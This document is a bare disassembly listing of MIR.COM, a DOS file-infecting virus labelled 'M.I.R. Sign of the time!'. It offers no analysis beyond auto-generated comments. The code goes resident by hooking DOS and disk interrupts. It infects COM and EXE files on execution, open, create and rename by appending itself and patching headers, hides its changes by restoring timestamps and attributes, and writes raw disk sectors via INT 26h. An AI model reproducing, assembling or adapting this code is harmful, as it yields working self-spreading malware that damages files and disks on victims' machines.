; File: MIR.COM
; File Type: COM
; Processor: 8086/87/88   
; Range: 00100h to 007d3h
; Memory Needed:     2 Kb
; Initial Stack: 0000:fffe
; Entry Point: 0000:0100
; Subroutines:   11
 
.radix 16
cseg		segment para public 'CODE'
		assume	cs:cseg,ds:cseg,es:cseg,ss:cseg
		org	0100h
; >>>> starts execution here <<<<
o00100		proc far
;-----------------------------------------------------
o00100		db	'M.'			;0000:0100 
d00102		db	'I.R.'			;0000:0102 
d00106		db	' *-*-*-* Sign of the ' ;0000:0106 
		db	'time!'			;0000:011b 
		db	00			;0000:0120 .
;-----------------------------------------------------
		nop	
		nop	
		nop	
		nop	
		pop	dx			
m00126:		mov	bx,es
		add	bx,10h
		add	bx,WORD PTR cs:[si+06c8h]
		mov	WORD PTR cs:[si+0053h],bx
		mov	bx,WORD PTR cs:[si+06c6h]
		mov	WORD PTR cs:[si+0051h],bx
		mov	bx,es
		add	bx,10h
		add	bx,WORD PTR cs:[si+06cch]
		mov	ss,bx
		mov	sp,WORD PTR cs:[si+06cah]
		jmp	0000:0000
m00155:		mov	di,0100h
		add	si,06ceh
		movsb				;Mov DS:[SI]->ES:[DI]
		movsw				;Mov DS:[SI]->ES:[DI]
		mov	sp,WORD PTR [d00006]
		xor	bx,bx			;Load register w/ 0
		push	bx			
		jmp	WORD PTR [si-0bh]
		call	s1 ;<0016b>
o00100  	endp 
 
;<0016b> 
s1      	proc near
		pop	si			
		sub	si,006bh
		cld				;Forward String Opers
		nop	
		cmp	WORD PTR cs:[si+06ceh],5a4dh
		jz	b0018b			;Jump if equal (ZF=1)
		cli				;Turn OFF Interrupts
		nop	
		mov	sp,si
		add	sp,07d1h
		sti				;Turn ON Interrupts
		nop	
		cmp	sp,WORD PTR [d00006]
		jnb	m00155			;Jump if >= (no sign)
b0018b:		push	ax			
		push	es			
		nop	
		push	si			
		push	ds			
		mov	di,si
		xor	ax,ax			;Load register w/ 0
		nop	
		push	ax			
		mov	ds,ax
		les	ax,DWORD PTR [d0004c]
		nop	
		mov	WORD PTR cs:[si+06bdh],ax
		mov	WORD PTR cs:[si+06bfh],es
		mov	WORD PTR cs:[si+06b8h],ax
		nop	
		mov	WORD PTR cs:[si+06bah],es
		mov	ax,WORD PTR [d00102]
		cmp	ax,0f000h
		nop	
		jnz	b00235			;Jump not equal(ZF=0)
		mov	WORD PTR cs:[si+06bah],ax
		mov	ax,WORD PTR [o00100]
		mov	WORD PTR cs:[si+06b8h],ax
		nop	
		mov	dl,80h
		mov	ax,WORD PTR [d00106]
		cmp	ax,0f000h
		jz	b001f2			;Jump if equal (ZF=1)
		nop	
		cmp	ah,0c8h
		jb	b00235			;Jump if <  (no sign)
		cmp	ah,0f4h
		jnb	b00235			;Jump if >= (no sign)
		nop	
		test	al,7fh			;Flags=Arg1 AND Arg2
		jnz	b00235			;Jump not equal(ZF=0)
		mov	ds,ax
		cmp	WORD PTR [d00000],0aa55h
		nop	
		jnz	b00235			;Jump not equal(ZF=0)
		mov	dl,BYTE PTR [d00002]
b001f2:		mov	ds,ax
		xor	dh,dh			;Load register w/ 0
		mov	cl,09
		shl	dx,cl			;Multiply by 2's
		mov	cx,dx
		xor	si,si			;Load register w/ 0
b001fe:		lodsw				;Load AX with DS:[SI]
		cmp	ax,0fa80h
		jnz	b0020c			;Jump not equal(ZF=0)
		lodsw				;Load AX with DS:[SI]
		cmp	ax,7380h
		jz	b00217			;Jump if equal (ZF=1)
		jnz	b00221			;Jump not equal(ZF=0)
b0020c:		cmp	ax,0c2f6h
		jnz	b00223			;Jump not equal(ZF=0)
		lodsw				;Load AX with DS:[SI]
		cmp	ax,7580h
		jnz	b00221			;Jump not equal(ZF=0)
b00217:		inc	si			
		lodsw				;Load AX with DS:[SI]
		cmp	ax,40cdh
		jz	b00228			;Jump if equal (ZF=1)
		sub	si,03
b00221:		dec	si			
		dec	si			
b00223:		dec	si			
		loop	b001fe			;Dec CX;Loop if CX>0
		jmp	short b00235
b00228:		sub	si,07
		mov	WORD PTR cs:[di+06bdh],si
		mov	WORD PTR cs:[di+06bfh],ds
b00235:		mov	si,di
		pop	ds			
		push	cs			
		pop	ds			
		cmp	ax,02fah
		jnz	b0025c			;Jump not equal(ZF=0)
		xor	di,di			;Load register w/ 0
		mov	cx,06b8h
b00252:		lodsb				;Load AL with DS:[SI]
		scasb				;Flags = AL - ES:[DI]
		jnz	b0025c			;Jump not equal(ZF=0)
		loop	b00252			;Dec CX;Loop if CX>0
		pop	es			
		jmp	m002e9
b0025c:		pop	es			
		mov	ah,49h
		int	21h			;undefined
		mov	bx,0ffffh
		mov	ah,48h
		int	21h			;undefined
		sub	bx,00e0h
		jb	m002e9			;Jump if <  (no sign)
		mov	cx,es
		stc	
		adc	cx,bx
		mov	ah,4ah
		int	21h			;undefined
		mov	bx,00dfh
		stc	
		sbb	WORD PTR es:[d00002],bx
		push	es			
		mov	es,cx
		mov	ah,4ah
		int	21h			;undefined
		mov	ax,es
		dec	ax			
		mov	ds,ax
		mov	WORD PTR [d00001],0008h
		call	s11 ;<007a7>
		mov	bx,ax
		mov	cx,dx
		pop	ds			
		mov	ax,ds
		call	s11 ;<007a7>
		add	ax,WORD PTR [d00006]
		adc	dx,00
		sub	ax,bx
		sbb	dx,cx
		jb	b002b0			;Jump if <  (no sign)
		sub	WORD PTR [d00006],ax
b002b0:		pop	si			
		push	si			
		push	ds			
		push	cs			
		xor	di,di			;Load register w/ 0
		mov	ds,di
		lds	ax,DWORD PTR [d0009c]
		mov	WORD PTR cs:[si+0714h],ax
		mov	WORD PTR cs:[si+0716h],ds
		pop	ds			
		mov	cx,071ch
		repz	movsb			;Mov DS:[SI]->ES:[DI]
		xor	ax,ax			;Load register w/ 0
		mov	ds,ax
		pop	es			
m002e9:		pop	si			
		xor	ax,ax			;Load register w/ 0
		mov	ds,ax
		mov	ax,WORD PTR [d0004c]
		mov	WORD PTR cs:[si+06c2h],ax
		mov	ax,WORD PTR [d0004e]
		mov	WORD PTR cs:[si+06c4h],ax
		mov	WORD PTR [d0004c],06adh
		add	WORD PTR [d0004c],si
		mov	WORD PTR [d0004e],cs
		pop	ds			
		push	ds			
		push	si			
		mov	bx,si
		lds	ax,DWORD PTR [d0002a]
		xor	si,si			;Load register w/ 0
		mov	dx,si
b00319:		lodsw				;Load AX with DS:[SI]
		dec	si			
		test	ax,ax			;Flags=Arg1 AND Arg2
		jnz	b00319			;Jump not equal(ZF=0)
		add	si,03
		lodsb				;Load AL with DS:[SI]
		sub	al,41h
		mov	cx,0001h
		push	cs			
		pop	ds			
		add	bx,02b5h
		push	ax			
		push	bx			
		push	cx			
		int	25h			;undefined
		pop	ax			
		pop	cx			
		pop	bx			
		inc	BYTE PTR [bx+0ah]
		and	BYTE PTR [bx+0ah],0fh
		jnz	b00372			;Jump not equal(ZF=0)
		mov	al,BYTE PTR [bx+10h]
		xor	ah,ah			;Load register w/ 0
		mul	WORD PTR [bx+16h]
		add	ax,WORD PTR [bx+0eh]
		push	ax			
		mov	ax,WORD PTR [bx+11h]
		mov	dx,0020h
		mul	dx
		div	WORD PTR [bx+0bh]
		pop	dx			
		add	dx,ax
		mov	ax,WORD PTR [bx+08]
		add	ax,0040h
		cmp	ax,WORD PTR [bx+13h]
		jb	b0036f			;Jump if <  (no sign)
		inc	ax			
		and	ax,003fh
		add	ax,dx
		cmp	ax,WORD PTR [bx+13h]
		jnb	b0038b			;Jump if >= (no sign)
b0036f:		mov	WORD PTR [bx+08],ax
b00372:		pop	ax			
		xor	dx,dx			;Load register w/ 0
		push	ax			
		push	bx			
		push	cx			
		int	26h			;undefined
		pop	ax			
		pop	cx			
		pop	bx			
		pop	ax			
		cmp	BYTE PTR [bx+0ah],00
		jnz	b0038c			;Jump not equal(ZF=0)
		mov	dx,WORD PTR [bx+08]
		pop	bx			
		push	bx			
		int	26h			;undefined
b0038b:		pop	ax			
b0038c:		pop	si			
		xor	ax,ax			;Load register w/ 0
		mov	ds,ax
		mov	ax,WORD PTR cs:[si+06c2h]
		mov	WORD PTR [d0004c],ax
		mov	ax,WORD PTR cs:[si+06c4h]
		mov	WORD PTR [d0004e],ax
		pop	ds			
		pop	ax			
		cmp	WORD PTR cs:[si+06ceh],5a4dh
		jnz	b003af			;Jump not equal(ZF=0)
		jmp	m00126
b003af:		jmp	m00155
		mov	al,03
		iret				;POP flags and Return
		pushf				;Push flags on Stack
		call	s7 ;<00728>
		popf				;Pop flags off Stack
		jmp	DWORD PTR cs:[d00714]
b003bf:		mov	WORD PTR cs:[d00714],dx
		mov	WORD PTR cs:[b00716],ds
		popf				;Pop flags off Stack
		iret				;POP flags and Return
b003cb:		mov	WORD PTR cs:[d00718],dx
		mov	WORD PTR cs:[d0071a],ds
		popf				;Pop flags off Stack
		iret				;POP flags and Return
b003d7:		les	bx,DWORD PTR cs:[d00714]
		popf				;Pop flags off Stack
		iret				;POP flags and Return
b003de:		les	bx,DWORD PTR cs:[d00718]
		popf				;Pop flags off Stack
		iret				;POP flags and Return
b003e5:		call	s5 ;<0050b>
		call	s7 ;<00728>
		popf				;Pop flags off Stack
		jmp	DWORD PTR cs:[d00718]
;-----------------------------------------------------
		db	'&^%s%c'		;0000:03f1 
;-----------------------------------------------------
		and	ax,0064h
		push	bp			;Get Args from Stack
		mov	bp,sp
		push	WORD PTR [bp+06]
		popf				;Pop flags off Stack
		pop	bp			;End High Level Subr
		pushf				;Push flags on Stack
		call	s8 ;<00732>
		cmp	ax,2521h
		jz	b003cb			;Jump if equal (ZF=1)
		cmp	ax,2527h
		jz	b003bf			;Jump if equal (ZF=1)
		cmp	ax,3527h
		jz	b003d7			;Jump if equal (ZF=1)
		cld				;Forward String Opers
		cmp	ax,4b00h
		jz	b003e5			;Jump if equal (ZF=1)
		cmp	ah,3ch
		jz	b0042f			;Jump if equal (ZF=1)
		cmp	ah,3eh
		jz	b0046b			;Jump if equal (ZF=1)
		cmp	ah,5bh
		jnz	b00495			;Jump not equal(ZF=0)
b0042f:		cmp	WORD PTR cs:[d006d1],00
		jnz	b004ac			;Jump not equal(ZF=0)
		call	s2 ;<004c2>
		jnz	b004ac			;Jump not equal(ZF=0)
		call	s7 ;<00728>
		popf				;Pop flags off Stack
		call	s4 ;<00504>
		jb	b004b3			;Jump if <  (no sign)
		pushf				;Push flags on Stack
		push	es			
		push	cs			
		pop	es			
		push	si			
		push	di			
		push	cx			
		push	ax			
		mov	di,06d1h
		stosw				;Store AX at ES:[DI]
		mov	si,dx
		mov	cx,0041h
b00456:		lodsb				;Load AL with DS:[SI]
		stosb				;Store AL at ES:[DI]
		test	al,al			;Flags=Arg1 AND Arg2
		jz	b00463			;Jump if equal (ZF=1)
		loop	b00456			;Dec CX;Loop if CX>0
		mov	WORD PTR es:[d006d1],cx
b00463:		pop	ax			
		pop	cx			
		pop	di			
		pop	si			
		pop	es			
b00468:		popf				;Pop flags off Stack
		jnb	b004b3			;Jump if >= (no sign)
b0046b:		cmp	bx,WORD PTR cs:[d006d1]
		jnz	b004ac			;Jump not equal(ZF=0)
		test	bx,bx			;Flags=Arg1 AND Arg2
		jz	b004ac			;Jump if equal (ZF=1)
		call	s7 ;<00728>
		popf				;Pop flags off Stack
		call	s4 ;<00504>
		jb	b004b3			;Jump if <  (no sign)
		pushf				;Push flags on Stack
		push	ds			
		push	cs			
		pop	ds			
		push	dx			
		mov	dx,06d3h
		call	s5 ;<0050b>
		mov	WORD PTR cs:[d006d1],0000h
		pop	dx			
		pop	ds			
		jmp	short b00468
b00495:		cmp	ah,3dh
		jz	b004a4			;Jump if equal (ZF=1)
		cmp	ah,43h
		jz	b004a4			;Jump if equal (ZF=1)
		cmp	ah,56h
		jnz	b004ac			;Jump not equal(ZF=0)
b004a4:		call	s2 ;<004c2>
		jnz	b004ac			;Jump not equal(ZF=0)
		call	s5 ;<0050b>
b004ac:		call	s7 ;<00728>
		popf				;Pop flags off Stack
		call	s4 ;<00504>
b004b3:		pushf				;Push flags on Stack
		push	ds			
		call	s9 ;<0078b>
		mov	BYTE PTR [d00000],5ah
		pop	ds			
		popf				;Pop flags off Stack
		ret	0002h			;(far)
s1      	endp 
 
;<004c2> 
s2      	proc near
		push	ax			
		push	si			
		mov	si,dx
b004c6:		lodsb				;Load AL with DS:[SI]
		test	al,al			;Flags=Arg1 AND Arg2
		jz	b004f3			;Jump if equal (ZF=1)
		cmp	al,64h ;(d)
		jz	b004f3			;Jump if equal (ZF=1)
		add	al,01
		cmp	al,2eh ;(.)
		jnz	b004c6			;Jump not equal(ZF=0)
		call	s3 ;<004f8>
		mov	ah,al
		call	s3 ;<004f8>
		cmp	ax,6f76h
		jz	b004ee			;Jump if equal (ZF=1)
		cmp	ax,6578h
		jnz	b004f5			;Jump not equal(ZF=0)
		call	s3 ;<004f8>
		cmp	al,65h ;(e)
		jmp	short b004f5
b004ee:		call	s3 ;<004f8>
		jnz	b004f5			;Jump not equal(ZF=0)
b004f3:		inc	al
b004f5:		pop	si			
		pop	ax			
		ret	
s2      	endp 
 
;<004f8> 
s3      	proc near
		lodsb				;Load AL with DS:[SI]
		cmp	al,43h ;(C)
		jb	b00503			;Jump if <  (no sign)
		cmp	al,59h ;(Y)
		jnb	b00503			;Jump if >= (no sign)
		add	al,19h
b00503:		ret	
s3      	endp 
 
;<00504> 
s4      	proc near
		pushf				;Push flags on Stack
		call	DWORD PTR cs:[d00718]
		ret	
s4      	endp 
 
;<0050b> 
s5      	proc near
		push	ds			
		push	es			
		push	si			
		push	di			
		push	ax			
		push	bx			
		push	cx			
		push	dx			
		mov	si,ds
		xor	ax,ax			;Load register w/ 0
		mov	ds,ax
		les	ax,DWORD PTR [d00090]
		push	es			
		push	ax			
		mov	WORD PTR [d00090],02b2h
		mov	WORD PTR [d00092],cs
		les	ax,DWORD PTR [d0004c]
		mov	WORD PTR cs:[d006c2],ax
		mov	WORD PTR cs:[d006c4],es
		mov	WORD PTR [d0004c],06adh
		mov	WORD PTR [d0004e],cs
		push	es			
		push	ax			
		mov	ds,si
		xor	cx,cx			;Load register w/ 0
		mov	ax,4300h
		call	s4 ;<00504>
		mov	bx,cx
		and	cl,0feh
		cmp	cl,bl
		jz	b0055c			;Jump if equal (ZF=1)
		mov	ax,4301h
		call	s4 ;<00504>
		stc	
b0055c:		pushf				;Push flags on Stack
		push	ds			
		push	dx			
		push	bx			
		mov	ax,3d02h
		call	s4 ;<00504>
		jb	b00572			;Jump if <  (no sign)
		mov	bx,ax
		call	s6 ;<0059b>
		mov	ah,3eh
		call	s4 ;<00504>
b00572:		pop	cx			
		pop	dx			
		pop	ds			
		popf				;Pop flags off Stack
		jnb	b0057e			;Jump if >= (no sign)
		mov	ax,4301h
		call	s4 ;<00504>
b0057e:		xor	ax,ax			;Load register w/ 0
		mov	ds,ax
		pop	WORD PTR [d0004c]
		pop	WORD PTR [d0004e]
		pop	WORD PTR [d00090]
		pop	WORD PTR [d00092]
		pop	dx			
		pop	cx			
		pop	bx			
		pop	ax			
		pop	di			
		pop	si			
		pop	es			
		pop	ds			
		ret	
s5      	endp 
 
;<0059b> 
s6      	proc near
		spc=$
 		org	0006c2h
d006c2:		org	0006c4h
d006c4:		org	0006d1h
d006d1:		org	000714h
d00714:		org	000716h
d00716:		org	000718h
d00718:		org	00071ah
d0071a:		org	00071ch
d0071c:		org	00071dh
d0071d:		org	00071eh
d0071e:		org	000720h
d00720:		org	000724h
d00724:		org	spc
		push	cs			
		pop	ds			
		push	cs			
		pop	es			
		mov	dx,071ch
		mov	cx,0018h
		mov	ah,3fh
		int	21h			;undefined
		xor	cx,cx			;Load register w/ 0
		xor	dx,dx			;Load register w/ 0
		mov	ax,4202h
		int	21h			;undefined
		mov	WORD PTR [d00736],dx
		cmp	ax,06b8h
		sbb	dx,00
		jb	b0062c			;Jump if <  (no sign)
		mov	WORD PTR [d00734],ax
		cmp	WORD PTR [d0071c],5a4dh
		jnz	b005e0			;Jump not equal(ZF=0)
		mov	ax,WORD PTR [d00724]
		add	ax,WORD PTR [s8 ;<00732>]
		call	s11 ;<007a7>
		add	ax,WORD PTR [d00730]
		adc	dx,00
		mov	cx,dx
		mov	dx,ax
		jmp	short b005f5
b005e0:		cmp	BYTE PTR [d0071c],0e9h
		jnz	b0062d			;Jump not equal(ZF=0)
		mov	dx,WORD PTR [b0071d]
		add	dx,0103h
		jb	b0062d			;Jump if <  (no sign)
		dec	dh
		xor	cx,cx			;Load register w/ 0
b005f5:		sub	dx,68h
		sbb	cx,00
		mov	ax,4200h
		int	21h			;undefined
		add	ax,06d1h
		adc	dx,00
		cmp	ax,WORD PTR [d00734]
		jnz	b0062d			;Jump not equal(ZF=0)
		cmp	dx,WORD PTR [d00736]
		jnz	b0062d			;Jump not equal(ZF=0)
		mov	dx,0738h
		mov	si,dx
		mov	cx,06b8h
		mov	ah,3fh
		int	21h			;undefined
		jb	b0062d			;Jump if <  (no sign)
		cmp	cx,ax
		jnz	b0062d			;Jump not equal(ZF=0)
		xor	di,di			;Load register w/ 0
b00626:		lodsb				;Load AL with DS:[SI]
		scasb				;Flags = AL - ES:[DI]
		jnz	b0062d			;Jump not equal(ZF=0)
		loop	b00626			;Dec CX;Loop if CX>0
b0062c:		ret	
b0062d:		xor	cx,cx			;Load register w/ 0
		xor	dx,dx			;Load register w/ 0
		mov	ax,4202h
		int	21h			;undefined
		cmp	WORD PTR [d0071c],5a4dh
		jz	b00647			;Jump if equal (ZF=1)
		add	ax,091ch
		adc	dx,00
		jz	b0065e			;Jump if equal (ZF=1)
		ret	
b00647:		mov	dx,WORD PTR [d00734]
		neg	dl
		and	dx,0fh
		xor	cx,cx			;Load register w/ 0
		mov	ax,4201h
		int	21h			;undefined
		mov	WORD PTR [d00734],ax
		mov	WORD PTR [d00736],dx
b0065e:		mov	ax,5700h
		int	21h			;undefined
		pushf				;Push flags on Stack
		push	cx			
		push	dx			
		cmp	WORD PTR [d0071c],5a4dh
		jz	b00673			;Jump if equal (ZF=1)
		mov	ax,0100h
		jmp	short b0067a
b00673:		mov	ax,WORD PTR [d00730]
		mov	dx,WORD PTR [s8 ;<00732>]
b0067a:		mov	di,06c6h
		stosw				;Store AX at ES:[DI]
		mov	ax,dx
		stosw				;Store AX at ES:[DI]
		mov	ax,WORD PTR [d0072c]
		stosw				;Store AX at ES:[DI]
		mov	ax,WORD PTR [d0072a]
		stosw				;Store AX at ES:[DI]
		mov	si,071ch
		movsb				;Mov DS:[SI]->ES:[DI]
		movsw				;Mov DS:[SI]->ES:[DI]
		xor	dx,dx			;Load register w/ 0
		mov	cx,06d1h
		mov	ah,40h
		int	21h			;undefined
		jb	b006bf			;Jump if <  (no sign)
		xor	cx,ax
		jnz	b006bf			;Jump not equal(ZF=0)
		mov	dx,cx
		mov	ax,4200h
		int	21h			;undefined
		cmp	WORD PTR [d0071c],5a4dh
		jz	b006c1			;Jump if equal (ZF=1)
		mov	BYTE PTR [d0071c],0e9h
		mov	ax,WORD PTR [d00734]
		add	ax,0065h
		mov	WORD PTR [b0071d],ax
		mov	cx,0003h
		jmp	short b00716
b006bf:		jmp	short b0071d
b006c1:		call	s10 ;<007a4>
		not	ax
		not	dx
		inc	ax			
		jnz	b006cc			;Jump not equal(ZF=0)
		inc	dx			
b006cc:		add	ax,WORD PTR [d00734]
		adc	dx,WORD PTR [d00736]
		mov	cx,0010h
		div	cx
		mov	WORD PTR [d00730],0068h
		mov	WORD PTR [s8 ;<00732>],ax
		add	ax,006eh
		mov	WORD PTR [d0072a],ax
		mov	WORD PTR [d0072c],0100h
		add	WORD PTR [d00734],06d1h
		adc	WORD PTR [d00736],00
		mov	ax,WORD PTR [d00734]
		and	ax,01ffh
		mov	WORD PTR [d0071e],ax
		pushf				;Push flags on Stack
		mov	ax,WORD PTR [d00735]
		shr	BYTE PTR [d00737],1	;Divide by 2's
		rcr	ax,1			;CF-->[HI .. LO]-->CF
		popf				;Pop flags off Stack
		jz	b00710			;Jump if equal (ZF=1)
		inc	ax			
b00710:		mov	WORD PTR [d00720],ax
		mov	cx,0018h
b00716:		mov	dx,071ch
		mov	ah,40h
		int	21h			;undefined
b0071d:		pop	dx			
		pop	cx			
		popf				;Pop flags off Stack
		jb	b00727			;Jump if <  (no sign)
		mov	ax,5701h
		int	21h			;undefined
b00727:		ret	
s6      	endp 
 
;<00728> 
s7      	proc near
		spc=$
 		org	00072ah
d0072a:		org	00072ch
d0072c:		org	000730h
d00730:		org	spc
		push	ds			
		call	s9 ;<0078b>
		mov	BYTE PTR [d00000],4dh
		pop	ds			
s7      	endp 
 
;<00732> 
s8      	proc near
		spc=$
 		org	000732h
d00732:		org	000734h
d00734:		org	000735h
d00735:		org	000736h
d00736:		org	000737h
d00737:		org	spc
		push	ds			
		push	ax			
		push	bx			
		push	dx			
		xor	bx,bx			;Load register w/ 0
		mov	ds,bx
		lds	dx,DWORD PTR [d00084]
		cmp	dx,02fah
		jnz	b0074e			;Jump not equal(ZF=0)
		mov	ax,ds
		mov	bx,cs
		cmp	ax,bx
		jz	b00786			;Jump if equal (ZF=1)
		xor	bx,bx			;Load register w/ 0
b0074e:		mov	ax,WORD PTR [bx]
		cmp	ax,02fah
		jnz	b0075c			;Jump not equal(ZF=0)
		mov	ax,cs
		cmp	ax,WORD PTR [bx+02]
		jz	b00761			;Jump if equal (ZF=1)
b0075c:		inc	bx			
		jnz	b0074e			;Jump not equal(ZF=0)
		jz	b0077a			;Jump if equal (ZF=1)
b00761:		mov	ax,WORD PTR cs:[d00718]
		mov	WORD PTR [bx],ax
		mov	ax,WORD PTR cs:[d0071a]
		mov	WORD PTR [bx+02],ax
		mov	WORD PTR cs:[d00718],dx
		mov	WORD PTR cs:[d0071a],ds
		xor	bx,bx			;Load register w/ 0
b0077a:		mov	ds,bx
		mov	WORD PTR [d00084],02fah
		mov	WORD PTR [d00086],cs
b00786:		pop	dx			
		pop	bx			
		pop	ax			
		pop	ds			
		ret	
s8      	endp 
 
;<0078b> 
s9      	proc near
		push	ax			
		push	bx			
		mov	ah,62h
		call	s4 ;<00504>
		mov	ax,cs
		dec	ax			
		dec	bx			
b00796:		mov	ds,bx
		stc	
		adc	bx,WORD PTR [d00003]
		cmp	bx,ax
		jb	b00796			;Jump if <  (no sign)
		pop	bx			
		pop	ax			
		ret	
s9      	endp 
 
;<007a4> 
s10     	proc near
		mov	ax,WORD PTR [d00724]
s10     	endp 
 
;<007a7> 
s11     	proc near
		mov	dx,0010h
		mul	dx
		ret	
;-----------------------------------------------------
		cmp	ah,03
		jnz	b007c1			;Jump not equal(ZF=0)
		cmp	dl,80h
		jnb	b007bc			;Jump if >= (no sign)
		jmp	0000:0000
b007bc:		jmp	0000:0000
b007c1:		jmp	0000:0000
;-----------------------------------------------------
		db	00,01			;0000:07c6 ..
		db	6d dup (00h)		;0000:07c8 (.)
		db	0cdh,20,90,90,90,90	;0000:07ce . ....
s11     	endp 
		spc=$
 		org	000000h
d00000:		org	000001h
d00001:		org	000002h
d00002:		org	000003h
d00003:		org	000006h
d00006:		org	00002ah
d0002a:		org	00004ch
d00086:		org	000090h
d00090:		org	000092h
d00092:		org	00009ch
d0009c:		org	00009eh
d0009e:		org	spc
cseg		ends
		end	o00100
